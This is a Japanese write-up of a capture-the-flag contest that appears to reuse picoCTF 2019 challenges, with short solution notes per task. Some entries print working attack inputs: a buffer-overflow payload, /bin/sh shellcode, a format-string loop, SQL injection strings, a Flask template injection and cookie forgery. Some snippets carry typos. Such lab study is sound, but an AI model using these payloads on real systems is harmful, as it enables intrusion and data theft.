# CognitiveCTF2021 writeup

# 使用したTool
- jpegAnalyzer  
- wire shark  
- 青い空を見上げればいつもそこに白い猫 for うさみみハリケーン
- EditThisCookie (chromeの拡張機能)
- CyberChef (encode/decodeのwebサイト)
- radare2
- ROPgadget
- ghidra (decompileできるリバースエンジニアリングソフト)

# 50 points
## 2Warm
- 2進数に変換する

## Glory of the Garden
- 画像をcatで見て、grepかfindstrで検索
```
cat ./garden.jpg | grep "CTF"
cat ./garden.jpg | findstr "CTF"
```

## Insp3ct0r
- chromeなら「検証」でHTMLとCSSとJavaScriptを確認できる

## The Numbers
- アルファベットのインデックスに対応  
- 「num_to_alph.py」で解いた

## practice-run-1
- cat&grepで検索してもいける  
- おそらくほかの方法もある

## handy-shellcode
- linux 32bit用のshell codeをググってコピペした。  
- なんとなく、このプログラムでshellを呼び出すコードを書くらしい  
- shell codeはよくわからない  
- shell codeの作り方?は、アセンブリ言語を機械語に翻訳する過程を踏むらしい  



# 100 points
## 13 (pt.100)
- 「rot13」でググるとrot13.comがでてくるので、コピペするだけ

## Bases (pt.100)
- base64でデコードする  
- 「google エンコード」とかでググるといい感じのencode/decodeサイトがでてくる

## Easy1
- ワンタイムパッドをググって、仕組みを理解  
- table.txtがあるので、暗号鍵をもとに行(又は列)を参照し、その行で対応する暗号フラグの列(又は行)を参照していく。  
- 地道な作業  

## First Grep
- たしか、catしてgrep
```
cat file_name | grep CTF
```

## OverFlow 1
- バッファオーバーフローを考える  　
- vuln()内で参照するリターンアドレスが表示されるプログラムである  
- flag()のアドレスをgdbなどで調べる  
- オーバフローしてアドレスが変更される境界線(文字列の長さ)を模索し、境界線以降にflag()のアドレスを入れる  
- アドレス入力の際に、リトルエンディアンに気を付ける  
- 入力例は以下  
```
echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x85\x04\x08" | ./vuln
```
- CognitiveCTF{n0w_w3r3_ChaNg1ng_r3tURn5_f4c9f24e}

## dont-use-client-side
- ソースを見ると、HTMLにJavascriptが埋め込まれてる  
- どうやら、JSでパスワードチェックしている  
- JSで比較している文字列を並び変えるだけ  

## logon
- cookieのadminをTrueにする  
- chromeだと、「EditThisCookie」という拡張機能が便利

## strings it
- バイナリファイルなので、stringsコマンド使う(windowsはわからない)
```
strings file_name | grep CTF
```

## vault-door-1
- Javaコードの中にパスワードを比較している部分がある  
- 32文字  
- 単純に並び変える？  

## what's a net cat?
- netcat使うだけ　　
```
nc address ip
```

## where are the robots
- robots.txtにアクセスして、そこの指示に従うだけ　　



# 150 points
## So Meta
- たしか、catしてgrepするだけ
```
cat file_name | grep CTF
```

## What Lies Within
- 「青い空を～」のステガノグラフィー解析を使った  
- 各色の最下位委ビットを選択して抽出する

## shark on wire 1
- ワイヤーシャークなどのパケット解析ツールを使用した  
- UDPストリームを愚直に調べる  



# 200 points
## Based
- 「CyberChef」で数字入れてautobakeすると、いい感じにでコードしてくれる  
- 2, 8, 10, 16進数を文字に変換するタスク  
- utf-8？shift-jis？  

## Tapping
- ncでアクセスすると、モールス信号が表示される
- モールス信号の返還サイトで変換

## asm1
- アセンブリ言語を頑張って読む  
- 答えの形式は、"CognitiveCTF{0xaaa}"のような感じ  

## plumbing
- ncしたのをパイプしてgrep
```
nc host_name port | grep CTF
```

## rsa_pop_quiz
- 結構時間かかった。RSAの仕組みと計算方法を理解しておくと速く解けそう  
- 問題文に表示されているnetcatを実行し、問題に答える  
- 全部で８問くらいあり、各問いの最初はこの問題が解けるかどうかをy/nでこたえる  
- 最後の問いで暗号文を平文に戻すが、以下のコードを使用した  
```
# p, n, e, c(暗号文)は事前に定義する必要あり
q = n // p
# pip install pycryptodome
from Crypto.Util.number import inverse
phai = (p - 1) * (q - 1)
d = inverse(e, phai)
pt = pow(c, d, n)
print(pt)s
```
- 表示された平文をHEXに変換し、asciiに変換する作業は、「CyberChef」がおすすめ  

## slippery_shellcode
- 「handy-shellcode」とほぼ同じコードだが、rand()を使っている
- rand()はseed値が固定という脆弱性があるそうなので、変数offsetのとる値をLinux環境で調べる(windowsではgid_tでerror)
- offsetは常に104とわかるので、shellcodeの前に適当な104文字をくっつけて入力するだけ
```
(python -c "print 'a'*104 + '\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'";cat) | ./vuln
```
- shellが起動するので、flag.txtをcatする

## whats-the-difference
- 結構悩んだ  
- cmpコマンドとgawkで差分のバイトをASCII変換  
```
cmp -l cattos.jpg kitters.jpg | gawk '{printf "%c", strtonum(0$2)}' && echo
```
- 上記の出力を回答しても、正解にならない。。。  
- cat_kit.pyを作成し、バイナリでjpgファイルを読み込んで、差分をASCIIに変換する  
```
python cat_kit.py
```
- 結果は同じになった  
- flagをよく見ると、ある程度単語があって、たまに数字になってる  
- "_bu77r_"をbufferと解釈し、"_bu773r_"とすると通った  
- 原因は不明...  

## where-is-the-file
```
ls -a
cat secret_file
```



# 250 points
## asm2
- 引数が2つの時のアセンブリ言語の挙動を追っていく
- どうやら以下のプログラムに変換できそうなので、やってみる
```
a1 = 0xf
a2 = 0x21
while a1 < 0xcdf1:
    a2 += 0x1
    a1 += 0xe3
print(hex(a2))
```

## c0rrupt
- fileを渡されるが、「青空白猫」のバイナリエディタで解析してみるとpngファイルっぽい
- ヒントにheaderを直す旨が書かれていたので、pngのフォーマットを調べて修正をかける
- linuxでは、「pngcheck」というtoolがあるため、使うとCRCの部分を計算して提案してくれたりする
- やったこととしては、PNG、IHDR、IDATのシグネチャとIDATのlengthを修正
- IDATのlength(サイズは4byte)は、先頭2byteを0にするだけだった

## like1000
- .tarファイルを解凍するshellスクリプトを書く  
- 例えば以下のコードを'hoge.sh'として保存し、実行する  
```
#! /bin/bash
i=100
tmp=''
hoge='.tar'
for ((i=1000;i>=1;i-->))
do
tmp=$i$hoge
tar -xvf $tmp
rm $tmp
done
```
```
bash hoge.sh
```

## vault-door-4
- public boolean checkPassword関数のbytes配列をdecodeするだけ
- ASCII => 文字列で変換してくれるwebサイトがある



# 300 points
## Irish-Name-Repo 1
- SQLインジェクションの代表的な奴をうちこむ
- ユーザ名の入力フォームに以下を打つ
```
' or 1 = 1 --
```

## flag_shop
- プログラムを見ると、フラグを購入する数が代入される変数はintで定義されている
- intはだいたい4byteで、取りうる値の範囲がわかるので負の値になるように入力する
- 自分の所持金が増えるはずなので、1337flagを購入する

## miniRSA
- eが小さいときには、dを算出することなしに、暗号文を復号できる
- 手法はcのe乗根をとるだけ
```
n = 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e = 3
c = 632842384140587174830925541187412664996674169932996191508185732662783016874159287466298559845859187680481790912872257884508491688706582583466621670584934824968165027905248218081988895883829955005590459045563487575434041612025991120362101218958824365113954333662349365055333 
from Crypto.Util.number import *
import gmpy
m = int(gmpy.root(c, e)[0])
print(long_to_bytes(m))
```

## mus1c
- rockstarと呼ばれる歌詞みたいなプログラミング言語らしい。以下のサイトで翻訳できる。
- https://codewithrockstar.com/online
- ASCIIコードが出力されるので、文字列に変換するだけ

## reverse_cipher
- ghidraでデコンパイルして、復元されたC言語プログラムのmain関数に注目
- flag.txtを変換する作業があるので、逆変換する

## stringzz
- format string攻撃
- どうやら、標準入力の変数をprintf()やputs()などの関数の引数に渡すとよくないらしい
- メモリの中身を見れるらしいので、以下のshell codeを書いて、flagを探す
```
#! /bin/bash

for ((i=0;i<100;i++))
do
echo -e "%$i\$s" | ./vuln | grep CTF
done
```

## waves over lambda
- アクセスすると、暗号文が表示される
- (https://quipqiup.com/)にアクセスして、アルファベットの対応関係を探る
- 最初の文は、「congrats here is your flag」に対応すると他サイトを見て知った
- ほかの対応関係は、長文をもとに探る



# 350 points
## 1_wanna_b3_a_r0ck5tar
- rockstarというプログラミング言語
- Listenやifなどの入力待ちや条件分岐があるので、削除するだけ

## 1_wanna_b3_a_r0ck5tar
- listenやif、elseといった入力待ちや条件分岐を削除して実行
- ASCIIコードが出てくるので、変換するだけ

## Investigative Reversing 2
- ghidraで解析して、暗号化手順の逆を行うプログラムを作成する

## pastaAAA
- png画像が渡されるので、青空白猫でステガノグラフィー解析する
- 各色の0bit目を抽出するとflag画像がでてくる

## seed-sPRiNG 
- ghidraで解析
- どうやら現在時刻をseed値として、rand()関数を実行しているようです
- この現在時刻はサーバ側のもので、localと差があることに注意(0.1秒ごとに変更されるというweb記事があった)
- サーバ側で発生した乱数値の30個を当て続けなければならない
- これは、スクリプトで自動で30個の乱数を同様に作成するプログラムを作成し、seed値をサーバと合わせる作業が必要(localからattackするなら)
- seed値の参考として、daytimeコマンドが使えそう
- 詳しくは、該当dirを参照

## vault-door-6 
- XORの性質を利用
- 入力データは、特定の値とXORをとっている
- A XOR B = Z  <=>  Z XOR B = A   の関係を利用
- つまり、比較しているmyBytesをもう一回特定の値でXORをとるだけ



# 400 points
## AES-ABC
- pythonファイルを解読して、逆のことをする

## Empire1
- ユーザ登録して、ログインして、add todo list でSQLインジェクション
- どうやら、SQliteらしい（根拠は不明）
```
' || (SELECT group_concat(sql) FROM sqlite_master) || '
```
- secretというテーブルがある？
```
' || (SELECT group_concat(secret) FROM user) || '
```

## Investigative Reversing 3
- 前回と同様に、ghidraで解析
- プログラムでやってる変換の逆変換をする

## Investigative Reversing 4 
- 前回と同様に、ghidraで解析
- プログラムでやってる変換の逆変換をする

## Need For Speed
- ghidraで解析
- set_timer関数でalarmが設定されているので、ここを呼ばないようにgdbでjumpした
```
gdb main
start
jump *main+24
```
- gdbで各関数のアドレスを確認するとよい

## Time's Up
- 実行すると、計算式が表示されるが、すぐ終了する
- 以下のスクリプトで計算を自動化する
```
from pwn import *
p = process("./times-up")
question = p.readuntil("\n").split(":")[1]
p.sendline(str(eval(question)))
p.interactive()
```

## asm4
- ほかのwriteupを参考に、アセンブリをいくつかのブロックに分ける
- 以下のフラグ表示Cプログラム(solve.c)を作成
```
#include <stdio.h>

int main(void)
{
    printf("picoCTF{0x%x}\n", asm4("picoCTF_d899a"));
    return 0;
}
```
- 以下でコンパイルして、実行(Windowsでは難しい)
```
gcc -m32 -c test.S -o test.o
gcc -m32 -c solve.c -o solve.o -w
gcc -m32 solve.o test.o
./a.out 
```

## b00tl3gRSA2
- eが大きい場合は、相対的にdが小さくなることを利用したWiener's attackが可能
- これをやってくれる便利なパッケージを使用(https://github.com/orisano/owiener)
```
import owiener
```



# 450 points
## Empire2
- どうやら、flaskを使ってるらしい
- たしか、{{config}}でtodoを追加すると、secretkeyが入手できる
- それと、cookieのsessionを取得して復号する

## Java Script Kiddie 2
- chromeのデベロッパーツールを使用
- networkを見ると、bytesというファイルが見られる
- pngの先頭の16bitフォーマットになるようにする
- javascriptは、32文字の内の偶数番目の文字を見ている(16文字分)
- 総当たりで、適切なnumberを見つけ、フォームに入力、出てきたpngをdecode

## b00tl3gRSA3
- nを構成する素数が3個以上ある
- この場合は、一般に暗号強度が下がるらしい(素数のbitサイズが小さくなるため)
- 総当たりするプログラムを作成

## cereal hacker 1
- guest, guestで入力すると、cookieの項目が増えたので、decode
- decodeされたcookie情報にadmin情報を追加し、encodeして、cookie更新

## vault-door-8
- 頑張って解読
- byte配列をencodeとは逆の手順で変換(つまり、逆変換)



# 500 points
## Empire3
- Empire2と同様に、secretkeyを入手
- cookieのsessionをdecodeして、_user_idを1とか2に変更してencodeしてcookie更新

## Time's Up, For the Last Time!
- タイマーを動作させないことを考える
- 以下を実行
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
/* reference */
/* https://github.com/AMACB/picoCTF-2019-writeups/blob/master/problems/times-up-for-the-last-time/README.md */

int main() {
    signal(SIGALRM, SIG_IGN);
    system("./times-up-one-last-time");
}
```

## cereal hacker 2
- phpのクエリでいろいろできそう
- 最終的には総当たりで、パスワード(フラグ)を当てる

## investigation_encoded_2
- ほかのwriteup写経
- map.txtに示すアルファベット&数字のバイナリとの対応表を作る
- むずかしい...
